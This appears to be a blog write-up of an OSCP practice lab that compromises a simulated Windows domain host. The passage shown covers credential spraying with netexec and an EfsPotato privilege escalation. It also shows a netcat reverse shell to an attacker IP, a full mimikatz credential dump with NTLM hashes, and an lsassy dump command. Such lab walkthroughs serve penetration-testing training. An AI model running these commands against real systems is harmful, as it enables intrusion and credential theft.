---
title: OSCP B
date: 2026-07-04
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - Lateral-Movement-Account-Verify-Nxc
  - Windows-Privilege-Escalation-SeImpersonatePrivilege
  - Lateral-Movement-Mimikatz
  - Lateral-Movement-NXC
  - Lateral-Movement-Impacket-SecretsDump
  - Lateral-Movement-Kerberos
  - File-transfer-python-uploadserver
  - Lateral-Movement-naabu
  - Port1433-Mssql-xp-cmdshell-RCE
  - Lateral-Movement-Ligolo-Proxy-port-forward
  - Port161-snmp
  - offsec
lastmod: 2026-07-06T13:49:30.050Z
---
# Box Info

This lab immerses learners in a realistic Active Directory environment where exposed services and misconfigurations pave the way to a full domain compromise. Starting with service enumeration, learners identify vulnerable entry points and exploit a web application for initial access. From there, they escalate privileges locally and launch a Kerberoasting attack to extract and crack service account credentials. These credentials enable lateral movement and remote command execution via a misconfigured SQL Server. Finally, learners escalate to NT AUTHORITY\SYSTEM using SeImpersonatePrivilege and extract domain admin credentials to complete the compromise.

***

# IP 2

summary the openport only with One-Paragraph -- AI

```

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds
           Raw packets sent: 80701 (3.551MB) | Rcvd: 68468 (2.740MB)
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-04 11:20 HKT
Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 95.24% done; ETC: 11:22 (0:00:07 remaining)
Nmap scan report for 192.168.135.147
Host is up (0.15s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e0:3a:63:4a:07:83:4d:0b:6f:4e:8a:4d:79:3d:6e:4c (RSA)
|   256 3f:16:ca:33:25:fd:a2:e6:bb:f6:b0:04:32:21:21:0b (ECDSA)
|_  256 fe:b0:7a:14:bf:77:84:9a:b3:26:59:8d:ff:7e:92:84 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2026-07-04T10:23:04+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=Cloudbase-Init WinRM
| Not valid before: 2026-07-03T10:16:54
|_Not valid after:  2036-07-01T10:16:54
7680/tcp  open  pando-pub?
8000/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
|_http-open-proxy: Proxy might be redirecting requests
8080/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
8443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2026-07-04T10:23:04+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=MS01.oscp.exam
| Subject Alternative Name: DNS:MS01.oscp.exam
| Not valid before: 2022-11-11T07:04:43
|_Not valid after:  2023-11-10T00:00:00
|_http-title: Bad Request
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time: 
|   date: 2026-07-04T10:22:51
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 184.69 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-07-04 11:23 HKT
Nmap scan report for 192.168.135.147
Host is up (0.090s latency).
Not shown: 99 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
49182/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 1.30 seconds

```

### NXC

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Account-Verify-Nxc" >}} That one-line command will also try with the --local-auth with only one username and password

{{< /toggle >}}

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}..."; netexec $proto 192.168.135.147 -u Eric.Wallows -p  EricLikesRunning800 $auth; done; done

[*] Copying default configuration file
SMB         192.168.135.147 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         192.168.135.147 445    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 

[*] Testing smb (local-auth)...
SMB         192.168.135.147 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:None)
SMB         192.168.135.147 445    MS01             [-] MS01\Eric.Wallows:EricLikesRunning800 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       192.168.135.147 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam) 
WINRM       192.168.135.147 5985   MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (Pwn3d!)

[*] Testing winrm (local-auth)...
WINRM       192.168.135.147 5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam) 
WINRM       192.168.135.147 5985   MS01             [-] MS01\Eric.Wallows:EricLikesRunning800

[*] Testing wmi ...
RPC         192.168.135.147 135    MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
RPC         192.168.135.147 135    MS01             [+] oscp.exam\Eric.Wallows:EricLikesRunning800 

[*] Testing wmi (local-auth)...
RPC         192.168.135.147 135    MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam)
RPC         192.168.135.147 135    MS01             [-] MS01\Eric.Wallows:EricLikesRunning800 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

[*] Testing rdp (local-auth)...

[*] Testing ssh ...
SSH         192.168.135.147 22     192.168.135.147  [*] SSH-2.0-OpenSSH_for_Windows_8.1
SSH         192.168.135.147 22     192.168.135.147  [+] Eric.Wallows:EricLikesRunning800 (Pwn3d!) with UAC - Windows - Shell access!

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG]
               [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG]
               [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...

[*] Testing mssql (local-auth)...

[*] Testing ftp ...
FTP         192.168.135.147 21     192.168.135.147  [-] Eric.Wallows:EricLikesRunning800 (Response:530 User cannot log in, home directory inaccessible.)

[*] Testing ftp (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG]
               [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth


```

### SeImpersonatePrivilege

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-SeImpersonatePrivilege" >}} Abuing the SeImpersonatePrivilege with EfsPotato and nc64.exe to have the RCE

{{< /toggle >}}

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State  
============================= ========================================= =======
SeShutdownPrivilege           Shut down the system                      Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
SeTimeZonePrivilege           Change the time zone                      Enabled

```

Download the EfsPotato

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─# wget https://raw.githubusercontent.com/zcgonvh/EfsPotato/refs/heads/master/EfsPotato.cs
```

Upload   EfsPotato

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> upload EfsPotato.cs .
Uploading /home/tester/Desktop/offsec/oscpB/EfsPotato.cs: 100%|█| 24.8k/24.8k [00:02<00:00, 10.
[+] File uploaded successfully as: C:\Users\eric.wallows\Documents\EfsPotato.cs
```

Compile the  EfsPotato

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.303
19\csc.exe .\EfsPotato.cs -nowarn:1691,618
Microsoft (R) Visual C# Compiler version 4.8.4084.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240
```

Verify the EfsPotato.exe can run the admin command

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> ./EfsPotato.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: OSCP\eric.wallows
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=ee7db0)
[+] Get Token: 872
[!] process with pid: 2756 created.
==============================
nt authority\system

```

Download the nc64.exe and upload

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
--2026-07-04 12:48:05--  https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/int0x33/nc.exe/refs/heads/master/nc64.exe [following]
--2026-07-04 12:48:06--  https://raw.githu
```

Execute the EfsPotato.exe and run the nc64.exe to have RCE

```
evil-winrm-py PS C:\Users\eric.wallows\Documents> .\EfsPotato.exe  "nc64.exe 192.168.45.162  9999 -e powershell"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: OSCP\eric.wallows
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=e48aa0)
[+] Get Token: 856
[!] process with pid: 5168 created.
==============================

```

Receive the RCE with rlwrap

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $rlwrap nc -nlvp 9999
Listening on 0.0.0.0 9999
Connection received on 192.168.135.147 51369
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\eric.wallows\Documents> whoami 
whoami 
nt authority\system
PS C:\Users\eric.wallows\Documents> 

```

### mimikatz

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-Mimikatz" >}} With Admin power to run the sekurlsa::logonpasswords to do the windows internal 's LSA attack , to have the username of web\_svc and cloudbase-init 's NTLM

{{< /toggle >}}

```
PS C:\Users\eric.wallows\Documents> ./mimikatz.exe
./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1070385 (00000000:00105531)
Session           : Batch from 0
User Name         : web_svc
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 7/4/2026 3:22:48 AM
SID               : S-1-5-21-2610934713-1581164095-2706428072-2606
	msv :	
	 [00000003] Primary
	 * Username : web_svc
	 * Domain   : OSCP
	 * NTLM     : 53e938166782a44e241beaf02d081ff6
	 * SHA1     : e7f3a3cf293b58a124e1c636a07dae46ff9946ae
	 * DPAPI    : 1419bfc1f1c29b5a7dbbe53972e7b2bb
	tspkg :	
	wdigest :	
	 * Username : web_svc
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : web_svc
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 764195 (00000000:000ba923)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 7/4/2026 3:20:14 AM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:23 AM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 108934 (00000000:0001a986)
Session           : Service from 0
User Name         : cloudbase-init
Domain            : MS01
Logon Server      : MS01
Logon Time        : 7/4/2026 3:16:23 AM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1004
	msv :	
	 [00000003] Primary
	 * Username : cloudbase-init
	 * Domain   : MS01
	 * NTLM     : b597842d084f4e6bc3ebf9da497b00a9
	 * SHA1     : 0f6528f4441d893dcef0b1bad5844c1126d1e9c7
	tspkg :	
	wdigest :	
	 * Username : cloudbase-init
	 * Domain   : MS01
	 * Password : (null)
	kerberos :	
	 * Username : cloudbase-init
	 * Domain   : MS01
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 52860 (00000000:0000ce7c)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : cc347a164e1bf1a36e2c0552dae0003e
	 * SHA1     : bfdacb7592df08a3ac5245fe004685bf53441cf6
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : a8 8f 03 0f 1b 9a 75 c7 94 10 5d 36 e7 56 34 3b 89 6c 35 68 50 94 53 7c 4a 60 db ec eb fa 56 ed 2f 36 88 b0 b2 2f 10 8e 11 b6 be 10 7f d4 f2 b5 39 cd 0b b4 dc 4e e5 57 c0 ae 17 cc 7b ab 73 19 39 45 4e a9 8c c6 de 67 84 ce 45 09 bb e3 3c 3c 4f af 8c ff c9 40 a1 96 6a b8 e2 8d c0 69 12 e7 e7 87 ce 1a 5b 38 b2 f0 11 40 fa 4e 34 8e 1d 33 6e d3 c4 5e 91 c7 83 df be dd 45 30 a7 3f f5 29 b2 51 02 25 c4 67 79 c9 5d 7b 90 c9 3a c7 fd 89 1e 23 05 8e 31 cc 4e 9f 7d 8e cb 10 e0 1b 81 58 50 df 29 26 d4 73 4b 93 cf 9d a7 55 7d 53 57 a9 c9 08 96 93 2d 65 82 88 04 d5 14 fe ac 0e d7 a3 9c c2 0e 63 a6 ed a3 bb 83 97 f7 a3 08 68 0d 4c b7 77 77 0a 3e 85 26 15 ff 92 b8 8a 00 26 c2 b4 f2 d5 25 bd 8e d4 f7 74 39 2e 78 27 e7 26 20 0e 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 52770 (00000000:0000ce22)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31669 (00000000:00007bb5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 31621 (00000000:00007b85)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : oscp.exam
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 28998 (00000000:00007146)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : OSCP
	 * NTLM     : c95248e31501068270755ddfd382f3e8
	 * SHA1     : 88170a3f8335ac947aee79af8a1a984924acb420
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 7/4/2026 3:16:22 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : OSCP.EXAM
	 * Password : 99 6d 3e de 91 4e 0a e3 7e 32 53 7d d5 13 ec 39 86 fb 71 e6 9f 56 93 ec cb 30 bf 68 b8 2d c3 6e 3d fe 5b ac 28 c1 61 26 e0 71 ad 6c 53 5c 1e 13 6a eb 7d a1 19 3b 60 28 a9 81 bc 7a db cf bb c4 91 07 03 13 e6 03 27 9e ab 5e 42 b4 30 c8 28 a7 17 09 11 03 4a ea d1 9d dd 94 dc 36 c8 89 ff b8 17 49 fc 9f bf 86 ff 82 2b 04 6a 02 d9 7d 32 94 81 a2 6c e6 fe 97 1a b8 dd c6 4b 05 eb a7 c4 9b 2e 5d 00 a3 0b 02 88 43 78 57 4c 5d db 1d 58 78 27 04 4f 0c cb f2 4f 73 b1 00 a3 e5 ca 9d 12 3d 06 9f 7a 3b 6d fd 94 60 0a ab ff 3b 9f 30 f5 43 5e ea 8a 5f 6c 34 b5 c4 09 17 89 be 3f 26 af 10 10 7e 1a 3c 7b d5 7e be 21 ce 50 e9 fe bd 9b 57 86 d9 43 3f 95 6f da aa 4b a8 4f 61 89 97 1a b7 a2 f8 aa f8 54 1e 78 c5 7b 74 0f 87 1d fd ea 95 
	ssp :	
	credman :	
	cloudap :	


```

{{< toggle "Tag 🏷️" >}}

{{< tag "Lateral-Movement-NXC" >}} Adding the user into Administrators group, and using the nxc 's -m lsassy to extra LSA 's username and password

{{< /toggle >}}

```
PS C:\Users\eric.wallows\Documents> net localgroup Administrators Eric.Wallows /add
The command completed successfully.
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpB]
└──╼ $nxc smb 192.168.135.147  -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
SMB         192.168.135.147 445    MS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:MS01) (domain:oscp.exam) (signing:False) (SMBv1:None)
